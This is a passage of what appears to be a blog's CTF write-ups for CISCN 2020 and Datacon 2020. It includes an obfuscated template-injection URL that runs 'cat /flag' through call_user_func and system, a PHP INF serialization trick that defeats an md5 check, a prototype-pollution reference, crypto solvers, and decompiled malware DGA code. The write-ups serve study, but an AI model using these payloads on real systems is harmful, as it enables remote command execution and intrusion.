class="line">http:&#x2F;&#x2F;eci-2ze2t1c804gx8zlnp248.cloudeci1.ichunqiu.com&#x2F;?a&#x3D;&#123;if:(implode(%27%27,%20[%27c%27,%27a%27,%27l%27,%27l%27,%27_%27,%27u%27,%27s%27,%27e%27,%27r%27,%27_%27,%27f%27,%27u%27,%27n%27,%27c%27])(implode(%27%27,[%27s%27,%27y%27,%27s%27,%27t%27,%27e%27,%27m%27]),%27cat%20&#x2F;flag%27))&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>æœä¸€å‘è¿™ä¸ªset-value åŸå‹é“¾æ±¡æŸ“ï¼š<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a>ã€‚</p><p>ç›´æ¥æ‰“ï¼š</p><p><img src="/2020/08/21/2020-ciscn/image-20200821104630661.png" alt="image-20200821104630661"></p><p><img src="/2020/08/21/2020-ciscn/image-20200821104643227.png" alt="image-20200821104643227"></p><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>æƒ³åŠæ³•ç»•è¿‡ md5ï¼Œå¼€å§‹çš„æ€è·¯æ˜¯é€šè¿‡ç±»ï¼Œä¸è¿‡exceptionå’Œerrorç±» __toString é•¿åº¦å¤ªé•¿äº†ï¼Œæ²¡æ³•ç»•è¿‡ã€‚åæ¥å‘ç° INF å¯ä»¥ç»•è¿‡ï¼ŒINF å˜æˆå­—ç¬¦ä¸²åæ˜¯ â€œINFâ€ï¼Œmd5 æ—¶ä¼šè½¬æˆå­—ç¬¦ä¸²â€INFâ€ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚è€Œ (string)INF != INFï¼Œå¯ä»¥ç»•è¿‡ã€‚</p><p><img src="/2020/08/21/2020-ciscn/image-20200821105029180.png" alt="image-20200821105029180"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $trick1=INF;</span><br><span class="line">   <span class="keyword">public</span> $trick2=INF;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">var_dump((<span class="keyword">string</span>)$a-&gt;trick1);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lfsr"><a href="#lfsr" class="headerlink" title="lfsr"></a>lfsr</h3><p>æ¢å¤ maskï¼Œ100ä¸ªæ–¹ç¨‹ï¼Œè§£æ–¹ç¨‹å³å¯ã€‚</p><p>Python è§£æ–¹ç¨‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>(<span class="params">stream</span>):</span></span><br><span class="line">    dim = <span class="number">100</span></span><br><span class="line">    magic = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[i:i + <span class="number">100</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    cipher = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[<span class="number">100</span>:]))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) == <span class="number">100</span></span><br><span class="line">    <span class="comment"># é«˜æ–¯æ¶ˆå…ƒ</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>((<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, cipher)))[::<span class="number">-1</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read(<span class="number">200</span>).strip()</span><br><span class="line"><span class="built_in">print</span> get_mask(data)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨sageè§£å¸Œå°”å¯†ç çš„æ–¹æ³•ç›´æ¥è§£ï¼ˆå¼‚æˆ–ç›¸åŠ å¯ä»¥å¯¹åº”ä¹˜æ³•ç›¸åŠ æ¨¡2ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read(<span class="number">200</span>).strip()</span><br><span class="line">A = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[i:i + <span class="number">100</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">res = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[<span class="number">100</span>:]))</span><br><span class="line">R = IntegerModRing(<span class="number">2</span>)</span><br><span class="line">A = Matrix(R,A)</span><br><span class="line">res = vector(R,res)</span><br><span class="line">ans = A.solve_right(res)</span><br><span class="line">print(<span class="built_in">int</span>((<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">list</span>(ans))))[::<span class="number">-1</span>], <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h3><p>d è¾ƒå°ï¼ŒBoneh_Durfee æ”»å‡»ã€‚</p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p>]]></content>
      
      
      <categories>
          
          <category> ciscn </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 Datacon å¤§æ•°æ®å®‰å…¨åˆ†ææ¯”èµ›éƒ¨åˆ†é¢˜ç›® å†…æµ‹ç¬”è®°</title>
      <link href="/2020/08/16/2020-Datacon/"/>
      <url>/2020/08/16/2020-Datacon/</url>
      
        <content type="html"><![CDATA[<p>å»å¹´å‚åŠ äº†Datacon DNSæ¶æ„æµé‡æ–¹å‘çš„æ¯”èµ›ï¼Œæ‹¿äº†ç¬¬äº”ï¼Œå·®ç‚¹æ‹¿åˆ°å¥–orzï¼Œä»Šå¹´å‚åŠ äº†éƒ¨åˆ†èµ›é¢˜çš„å†…éƒ¨è¯„ä¼°ï¼Œä»¥ä¸‹æ˜¯åšé¢˜è®°å½•ã€‚</p><a id="more"></a><h1 id="DNS-æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ"><a href="#DNS-æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ" class="headerlink" title="DNS æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ"></a>DNS æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ</h1><h2 id="èµ›é¢˜ä¿¡æ¯"><a href="#èµ›é¢˜ä¿¡æ¯" class="headerlink" title="èµ›é¢˜ä¿¡æ¯"></a>èµ›é¢˜ä¿¡æ¯</h2><h3 id="è®¾è®¡è¯´æ˜"><a href="#è®¾è®¡è¯´æ˜" class="headerlink" title="è®¾è®¡è¯´æ˜"></a>è®¾è®¡è¯´æ˜</h3><p>DGAï¼ˆDomain generation algorithmï¼ŒåŸŸåç”Ÿæˆç®—æ³•ï¼‰æ˜¯ä¸€ç§åˆ©ç”¨ç‰¹å®šç§å­å­—ç¬¦ï¼Œç»“åˆåŠ å¯†ç®—æ³•ï¼Œè¿›è€Œç”Ÿæˆä¸€ç³»åˆ—ä¼ªéšæœºæ¶æ„åŸŸåçš„æ–¹æ³•ã€‚æ¶æ„è½¯ä»¶å¯ä½¿ç”¨DGAé€ƒé¿åŸŸåé»‘åå•çš„æ£€æµ‹ã€‚</p><p>æœ¬é¢˜ä¸­ï¼Œé€‰æ‰‹éœ€ä»ç»™å®šçš„DGAæ ·æœ¬ä¸­é€šè¿‡é€†å‘åˆ†æå‘ç°å…¶ä¸­å­˜åœ¨çš„DGAç®—æ³•ã€‚é€šè¿‡å¯¹DGAç®—æ³•çš„åˆ†æï¼Œæ ¹æ®ç»™å‡ºçš„åŒç®—æ³•ä½†ä¸åŒç§å­ç”Ÿäº§çš„åŸŸåè·å¾—æ–°çš„ç§å­ï¼Œæœ€ç»ˆç»™å‡ºä½¿ç”¨æ–°ç§å­ç”Ÿäº§çš„æ‰€æœ‰åŸŸåã€‚</p><h3 id="æ•°æ®è¯´æ˜"><a href="#æ•°æ®è¯´æ˜" class="headerlink" title="æ•°æ®è¯´æ˜"></a>æ•°æ®è¯´æ˜</h3><ul><li>sample1.exeã€sample2.exeã€sample3.exeï¼Œä¸åŒDGAç®—æ³•çš„ä¸‰ä¸ªæ ·æœ¬</li><li>20200510_domains1.txtã€20200510_domains2.txtã€20200510_domains3.txtï¼Œå„æ ·æœ¬å¯¹åº”çš„åŒç®—æ³•ä½†ä¸åŒç§å­çš„æ ·æœ¬ç”Ÿäº§çš„åŸŸåï¼Œè‹¥ç®—æ³•æ—¶é—´ç›¸å…³ï¼Œåˆ™ç”Ÿäº§æ—¶é—´ä¸º2020å¹´5æœˆ10æ—¥</li></ul><h3 id="æäº¤å½¢å¼"><a href="#æäº¤å½¢å¼" class="headerlink" title="æäº¤å½¢å¼"></a>æäº¤å½¢å¼</h3><p>é€‰æ‰‹æäº¤3ä¸ªtxtæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶çš„å‘½åè§„åˆ™å’Œå†…å®¹å¦‚ä¸‹ï¼š</p><ul><li><p>domains1.txt</p><p>ä½¿ç”¨sample1.exeä¸­ç®—æ³•å’Œæ–°ç§å­ç”Ÿäº§çš„ç®—æ³•è§„å®šä¸ªæ•°çš„åŸŸåã€‚æ¯ä¸ªåŸŸåä¸€è¡Œã€‚</p></li><li><p>domains2.txt</p><p>ä½¿ç”¨sample2.exeä¸­ç®—æ³•å’Œæ–°ç§å­ç”Ÿäº§çš„ç®—æ³•è§„å®šä¸ªæ•°çš„åŸŸåã€‚æ¯ä¸ªåŸŸåä¸€è¡Œã€‚</p></li><li><p>domains3.txt</p><p>ä½¿ç”¨sample3.exeä¸­ç®—æ³•å’Œæ–°ç§å­ç”Ÿäº§çš„ç®—æ³•è§„å®šä¸ªæ•°çš„åŸŸåã€‚æ¯ä¸ªåŸŸåä¸€è¡Œã€‚</p></li></ul><h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>è¿™ä¸ªé¢˜ä¸»è¦æ˜¯è€ƒå¯ŸåŸºæœ¬é€†å‘+ç®—æ³•åˆ†æï¼Œä¹‹å‰ä¹Ÿæ²¡åšè¿‡é€†å‘ï¼Œè¿™æ¬¡æ­£å¥½ç®—æ˜¯å…¥äº†é—¨ï¼Œè¸©äº†æŒºå¤šé€†å‘çš„å‘â€¦</p><h3 id="sample1"><a href="#sample1" class="headerlink" title="sample1"></a>sample1</h3><p>IDAæ‰“å¼€ï¼Œæ‰¾ä¸åˆ°mainå‡½æ•°ï¼Œæ–‡æœ¬æ¨¡å¼ä¸‹æœmainï¼Œæ‰¾åˆ°å…¥å£å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __main();</span><br><span class="line">  dga_v2(<span class="number">2020</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0xFD6512BE</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥ï¼Œ2020ã€4ã€6æ˜¯æ—¥æœŸï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯ç§å­ï¼Œåç¼–è¯‘dga_v2å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">dga_v2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+1Ch] [ebp-12Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">8</span>]; <span class="comment">// [esp+28h] [ebp-120h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v16[<span class="number">16</span>]; <span class="comment">// [esp+30h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> *v17[<span class="number">5</span>]; <span class="comment">// [esp+40h] [ebp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+54h] [ebp-F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+58h] [ebp-F0h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+5Ch] [ebp-ECh]</span></span><br><span class="line">  <span class="keyword">int</span> v21[<span class="number">4</span>]; <span class="comment">// [esp+64h] [ebp-E4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v22; <span class="comment">// [esp+74h] [ebp-D4h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+CBh] [ebp-7Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v24[<span class="number">4</span>]; <span class="comment">// [esp+CCh] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+D0h] [ebp-78h]</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)v24 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0x60</span>u);</span><br><span class="line">  qmemcpy(v17, _data_start__, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v18, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    v4 = v14 &amp; <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">48</span>);</span><br><span class="line">    v19 = (<span class="keyword">unsigned</span> __int8)a2;</span><br><span class="line">    v20 = (<span class="keyword">unsigned</span> __int8)a3;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int8)v4;</span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      v21[v5++] = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v18 + v7) ^= (<span class="keyword">unsigned</span> __int8)(a4 &gt;&gt; <span class="number">8</span> * (v7 &amp; <span class="number">3</span>));</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">8</span> );</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15[v8] = *(&amp;v18 + v8);</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != <span class="number">8</span> );</span><br><span class="line">    MD5Init(&amp;v22);</span><br><span class="line">    MD5Update(&amp;v22, v9, <span class="number">8</span>);</span><br><span class="line">    MD5Final(&amp;v22, v16);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v24, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (v16[v10] &amp; <span class="number">0xF</span>) + ((<span class="keyword">signed</span> <span class="keyword">int</span>)v16[v10] &gt;&gt; <span class="number">4</span>) + <span class="number">97</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt;= <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;v23 + <span class="built_in">strlen</span>(v24) + <span class="number">1</span>) = v11;</span><br><span class="line">        v24[<span class="built_in">strlen</span>(v24) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 != <span class="number">16</span> );</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v14 % (<span class="number">5</span> - v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v12 == <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(v24, v17[v12]);</span><br><span class="line">LABEL_16:</span><br><span class="line">    result = <span class="built_in">puts</span>(v24);</span><br><span class="line">    ++v14;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v14 != <span class="number">1000</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹äº†ä¸‹v22çš„ç±»å‹ï¼Œåˆ†æç®—æ³•æµç¨‹ï¼Œå¤§æ¦‚å°±æ˜¯é•¿åº¦ä¸º8çš„æ•°ç»„ï¼Œå‰ä¸‰ä¸ªæ˜¯å¹´æœˆæ—¥ï¼Œç¬¬å››ä¸ªæ˜¯0ï¼Œåé¢å››ä¸ªæ˜¯v14ï¼ˆæ¬¡æ•°ï¼‰çš„ä½32bitï¼Œä¸€ä¸ªå 8bitï¼Œç„¶åä¸ç§å­å¼‚æˆ–ï¼Œmd5å¾—åˆ°ç»“æœå†æŒ‰ç¨‹åºä¸€ä¸ªé€»è¾‘å¾—åˆ°å¯è§å­—ç¬¦ï¼Œç„¶åæ ¹æ®v14ç¡®å®šåç¼€ã€‚</p><p>è¿™é‡ŒMD5Updateè¿™äº›å‡½æ•°ä¿¡æ¯ç†åº”æ˜¯éšè—çš„ï¼Œå‡ºé¢˜äººæ²¡æ³¨æ„ï¼Œæ­£å¼æ¯”èµ›åº”è¯¥ç»™ä¿®æ­£äº†ï¼Œå…¶å®é€šè¿‡ Magic number å¯ä»¥åˆ¤æ–­æ˜¯ md5,æˆ‘è¿˜ä¸‹äº†æ–­ç‚¹åŠ¨æ€è°ƒè¯•éªŒè¯äº†ä¸€ä¸‹ã€‚</p><p>å…¶å®åªæœ‰ç§å­æœªçŸ¥ï¼Œç›´æ¥ç…§ç€é€»è¾‘å®ç°ä¸€éï¼Œæ‹¿ç¬¬ä¸€ä¸ªåŸŸåçˆ†ç ´ç§å­å°±å¥½äº†ã€‚md5ç®—æ³•æ˜¯ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªå®ç°ï¼š<a href="https://blog.csdn.net/weixin_42167759/article/details/81209320">https://blog.csdn.net/weixin_42167759/article/details/81209320</a>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;md5.c&quot;</span></span></span><br><span class="line"><span class="keyword">char</span> *v17[] = &#123;<span class="string">&quot;.biz&quot;</span>,<span class="string">&quot;.info&quot;</span>,<span class="string">&quot;.org&quot;</span>,<span class="string">&quot;.net&quot;</span>,<span class="string">&quot;.com&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> __int8 v18[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v15[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v16[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> v21[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v4;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> v14,v5,v6,v7,v8,v10,v11,v9,v12;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">dga_v2</span><span class="params">(<span class="keyword">int</span> a1,<span class="keyword">int</span> a2,<span class="keyword">int</span> a3,<span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">v14=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">v4 = v14 &amp; <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    v18[<span class="number">0</span>] = (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">48</span>);</span><br><span class="line">    v18[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)a2;</span><br><span class="line">    v18[<span class="number">2</span>] = (<span class="keyword">unsigned</span> __int8)a3;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int8)v4;</span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      v18[v5++ + <span class="number">4</span>] = v6;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line"></span><br><span class="line">v7 = <span 